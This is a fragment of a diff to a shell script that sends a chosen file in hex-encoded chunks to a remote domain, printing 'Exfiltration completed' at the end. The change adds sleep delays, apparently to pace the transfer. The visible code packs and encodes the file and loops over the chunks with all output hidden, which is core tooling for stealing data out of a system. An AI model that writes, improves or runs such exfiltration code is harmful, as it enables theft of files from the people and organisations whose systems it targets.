@@ -30,7 +30,7 @@ fi
 echo "[+] Sending file: $FILE_PATH in chunks to $DOMAIN"
 
 tar -czf - $FILE_PATH|./xxd -p >data
-
+sleep 1
 counter=0
 for dat in $(cat data)
 do
@@ -40,6 +40,7 @@ do
     then
         break
     fi
+    sleep 1
 done > /dev/null 2>&1
 
 echo "[+] Exfiltration completed."
